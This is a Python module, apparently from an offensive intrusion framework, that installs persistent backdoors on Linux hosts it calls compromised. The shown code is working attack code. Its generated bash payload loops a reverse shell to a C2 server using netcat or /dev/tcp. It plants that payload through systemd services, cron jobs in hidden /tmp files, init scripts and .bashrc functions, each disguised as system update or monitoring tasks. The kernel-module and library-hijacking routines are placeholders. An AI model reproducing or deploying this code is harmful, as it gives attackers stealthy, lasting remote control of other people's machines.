"""
Linux Persistence Module
Implements Linux-specific persistence methods including systemd services,
cron jobs, init scripts, and kernel module techniques
"""

import asyncio
import base64
import os
import tempfile
import uuid
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from loguru import logger

from .models import (
    CompromisedHost, PersistenceSession, PersistenceResult, BackdoorInfo,
    PersistenceMethod, BackdoorType, CommunicationProtocol, PersistenceConfig
)


class LinuxPersistence:
    """Linux-specific persistence implementation"""
    
    def __init__(self, config: PersistenceConfig):
        self.config = config
        logger.info("Linux Persistence module initialized")
    
    async def apply_persistence(self, host: CompromisedHost, 
                              method: PersistenceMethod,
                              session: PersistenceSession) -> PersistenceResult:
        """Apply Linux persistence method"""
        logger.info(f"Applying {method.value} on Linux host {host.ip_address}")
        
        try:
            if method == PersistenceMethod.LINUX_SYSTEMD:
                return await self._create_systemd_service(host, session)
            elif method == PersistenceMethod.LINUX_CRON:
                return await self._create_cron_persistence(host, session)
            elif method == PersistenceMethod.LINUX_INIT:
                return await self._create_init_script(host, session)
            elif method == PersistenceMethod.LINUX_BASHRC:
                return await self._create_bashrc_persistence(host, session)
            elif method == PersistenceMethod.LINUX_KERNEL_MODULE:
                return await self._create_kernel_module(host, session)
            elif method == PersistenceMethod.LINUX_LIBRARY_HIJACKING:
                return await self._create_library_hijacking(host, session)
            else:
                return PersistenceResult(
                    success=False,
                    host_id=host.host_id,
                    method=method,
                    error_message=f"Unsupported Linux method: {method.value}"
                )
                
        except Exception as e:
            logger.error(f"Linux persistence failed for {method.value}: {e}")
            return PersistenceResult(
                success=False,
                host_id=host.host_id,
                method=method,
                error_message=str(e)
            )
    
    async def _create_systemd_service(self, host: CompromisedHost, 
                                    session: PersistenceSession) -> PersistenceResult:
        """Create systemd service for persistence"""
        service_name = f"system-update-{uuid.uuid4().hex[:8]}"
        service_file = f"/etc/systemd/system/{service_name}.service"
        
        # Generate payload
        payload_script = self._generate_bash_payload(host, session)
        script_path = f"/usr/local/bin/{service_name}"
        
        # Create systemd service unit
        service_content = self._create_systemd_unit(service_name, script_path)
        
        # Commands to create and enable service
        commands = [
            f'echo "{payload_script}" > {script_path}',
            f'chmod +x {script_path}',
            f'echo "{service_content}" > {service_file}',
            f'systemctl daemon-reload',
            f'systemctl enable {service_name}',
            f'systemctl start {service_name}'
        ]
        
        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.LINUX_SYSTEMD,
            service_name=service_name,
            installation_path=script_path,
            stealth_features=['systemd_service', 'system_binary_location'],
            cleanup_commands=[
                f'systemctl stop {service_name}',
                f'systemctl disable {service_name}',
                f'rm -f {service_file}',
                f'rm -f {script_path}',
                f'systemctl daemon-reload'
            ]
        )
        
        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.LINUX_SYSTEMD,
            backdoor_info=backdoor,
            artifacts_created=[f"Service: {service_name}", f"File: {script_path}", f"Unit: {service_file}"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'service_name': service_name,
                'service_file': service_file,
                'script_path': script_path,
                'commands': commands
            }
        )
    
    async def _create_cron_persistence(self, host: CompromisedHost,
                                     session: PersistenceSession) -> PersistenceResult:
        """Create cron job for persistence"""
        cron_comment = f"# System maintenance task {uuid.uuid4().hex[:8]}"
        
        # Generate payload
        payload_script = self._generate_bash_payload(host, session)
        script_path = f"/tmp/.{uuid.uuid4().hex[:12]}"
        
        # Cron expression (every 15 minutes)
        cron_expression = f"*/15 * * * * {script_path} >/dev/null 2>&1"
        
        # Commands to create cron job
        commands = [
            f'echo "{payload_script}" > {script_path}',
            f'chmod +x {script_path}',
            f'(crontab -l 2>/dev/null; echo "{cron_comment}"; echo "{cron_expression}") | crontab -'
        ]
        
        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.LINUX_CRON,
            installation_path=script_path,
            cron_expression=cron_expression,
            stealth_features=['cron_job', 'hidden_file', 'tmp_location'],
            cleanup_commands=[
                f'crontab -l | grep -v "{script_path}" | crontab -',
                f'rm -f {script_path}'
            ]
        )
        
        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.LINUX_CRON,
            backdoor_info=backdoor,
            artifacts_created=[f"Cron Job: {cron_expression}", f"Script: {script_path}"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'cron_expression': cron_expression,
                'script_path': script_path,
                'commands': commands
            }
        )
    
    async def _create_init_script(self, host: CompromisedHost,
                                session: PersistenceSession) -> PersistenceResult:
        """Create init script for persistence"""
        script_name = f"system-monitor-{uuid.uuid4().hex[:8]}"
        init_script_path = f"/etc/init.d/{script_name}"
        
        # Generate payload
        payload_script = self._generate_bash_payload(host, session)
        
        # Create init script
        init_script_content = self._create_init_script_content(script_name, payload_script)
        
        # Commands to create and enable init script
        commands = [
            f'echo "{init_script_content}" > {init_script_path}',
            f'chmod +x {init_script_path}',
            f'update-rc.d {script_name} defaults',
            f'service {script_name} start'
        ]
        
        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.LINUX_INIT,
            service_name=script_name,
            installation_path=init_script_path,
            stealth_features=['init_script', 'system_service'],
            cleanup_commands=[
                f'service {script_name} stop',
                f'update-rc.d -f {script_name} remove',
                f'rm -f {init_script_path}'
            ]
        )
        
        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.LINUX_INIT,
            backdoor_info=backdoor,
            artifacts_created=[f"Init Script: {init_script_path}"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'script_name': script_name,
                'init_script_path': init_script_path,
                'commands': commands
            }
        )
    
    async def _create_bashrc_persistence(self, host: CompromisedHost,
                                       session: PersistenceSession) -> PersistenceResult:
        """Create bashrc/profile persistence"""
        username = host.credentials.get('username', 'root')
        bashrc_path = f"/home/{username}/.bashrc" if username != 'root' else "/root/.bashrc"
        
        # Generate payload
        payload_script = self._generate_bash_payload(host, session)
        script_path = f"/tmp/.{uuid.uuid4().hex[:12]}"
        
        # Bashrc addition (disguised as system function)
        bashrc_addition = f"""
# System performance monitoring function
system_monitor() {{
    {script_path} >/dev/null 2>&1 &
}}

# Auto-start system monitoring
if [ -f {script_path} ]; then
    system_monitor
fi
"""
        
        # Commands to add to bashrc
        commands = [
            f'echo "{payload_script}" > {script_path}',
            f'chmod +x {script_path}',
            f'echo "{bashrc_addition}" >> {bashrc_path}'
        ]
        
        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.LINUX_BASHRC,
            installation_path=script_path,
            stealth_features=['bashrc_persistence', 'hidden_file', 'function_disguise'],
            cleanup_commands=[
                f'sed -i "/system_monitor/,+8d" {bashrc_path}',
                f'rm -f {script_path}'
            ]
        )
        
        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.LINUX_BASHRC,
            backdoor_info=backdoor,
            artifacts_created=[f"Bashrc modification: {bashrc_path}", f"Script: {script_path}"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'bashrc_path': bashrc_path,
                'script_path': script_path,
                'commands': commands
            }
        )
    
    async def _create_kernel_module(self, host: CompromisedHost,
                                  session: PersistenceSession) -> PersistenceResult:
        """Create kernel module for persistence (advanced technique)"""
        module_name = f"netfilter_{uuid.uuid4().hex[:8]}"
        module_path = f"/lib/modules/$(uname -r)/kernel/net/{module_name}.ko"
        
        # Generate kernel module (placeholder - would need actual kernel module compilation)
        module_source = self._generate_kernel_module_source(host, session, module_name)
        
        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.LINUX_KERNEL_MODULE,
            installation_path=module_path,
            stealth_features=['kernel_module', 'rootkit_level', 'deep_hiding'],
            cleanup_commands=[
                f'rmmod {module_name}',
                f'rm -f {module_path}',
                f'depmod -a'
            ]
        )
        
        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.LINUX_KERNEL_MODULE,
            backdoor_info=backdoor,
            artifacts_created=[f"Kernel Module: {module_name}"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'module_name': module_name,
                'module_path': module_path,
                'note': 'Kernel module persistence requires compilation and root privileges'
            }
        )
    
    async def _create_library_hijacking(self, host: CompromisedHost,
                                      session: PersistenceSession) -> PersistenceResult:
        """Create library hijacking persistence"""
        # Target common libraries
        target_libs = ["libssl.so.1.1", "libcrypto.so.1.1", "libc.so.6"]
        target_lib = target_libs[0]  # Use first one for now
        
        hijack_path = f"/usr/local/lib/{target_lib}"
        
        # Generate malicious library (placeholder)
        lib_content = self._generate_malicious_library(host, session)
        
        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.LINUX_LIBRARY_HIJACKING,
            installation_path=hijack_path,
            stealth_features=['library_hijacking', 'ld_preload'],
            cleanup_commands=[f'rm -f {hijack_path}']
        )
        
        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.LINUX_LIBRARY_HIJACKING,
            backdoor_info=backdoor,
            artifacts_created=[f"Library: {hijack_path}"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'hijack_path': hijack_path,
                'target_lib': target_lib
            }
        )
    
    def _generate_bash_payload(self, host: CompromisedHost, 
                             session: PersistenceSession) -> str:
        """Generate bash-based payload"""
        c2_server = session.c2_servers[0] if session.c2_servers else "127.0.0.1:4444"
        host_ip, port = c2_server.split(':')
        
        payload = f"""#!/bin/bash
# System maintenance script
while true; do
    if command -v nc >/dev/null 2>&1; then
        nc -e /bin/bash {host_ip} {port} 2>/dev/null
    elif command -v bash >/dev/null 2>&1; then
        bash -i >& /dev/tcp/{host_ip}/{port} 0>&1 2>/dev/null
    fi
    sleep 300  # Wait 5 minutes before retry
done &
"""
        return payload
    
    def _create_systemd_unit(self, service_name: str, script_path: str) -> str:
        """Create systemd service unit file"""
        unit_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=forking
ExecStart={script_path}
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
"""
        return unit_content
    
    def _create_init_script_content(self, script_name: str, payload: str) -> str:
        """Create init script content"""
        init_script = f"""#!/bin/bash
### BEGIN INIT INFO
# Provides:          {script_name}
# Required-Start:    $network $local_fs
# Required-Stop:     $network $local_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System monitoring service
# Description:       System performance monitoring daemon
### END INIT INFO

case "$1" in
    start)
        echo "Starting {script_name}..."
        {payload}
        ;;
    stop)
        echo "Stopping {script_name}..."
        pkill -f "{script_name}"
        ;;
    restart)
        $0 stop
        $0 start
        ;;
    *)
        echo "Usage: $0 {{start|stop|restart}}"
        exit 1
        ;;
esac

exit 0
"""
        return init_script
    
    def _generate_kernel_module_source(self, host: CompromisedHost,
                                     session: PersistenceSession, 
                                     module_name: str) -> str:
        """Generate kernel module source code (placeholder)"""
        # In a real implementation, this would generate actual kernel module C code
        return f"/* Kernel module {module_name} - placeholder */"
    
    def _generate_malicious_library(self, host: CompromisedHost,
                                  session: PersistenceSession) -> bytes:
        """Generate malicious shared library (placeholder)"""
        # In a real implementation, this would generate a proper shared library
        return b"LIBRARY_PLACEHOLDER"
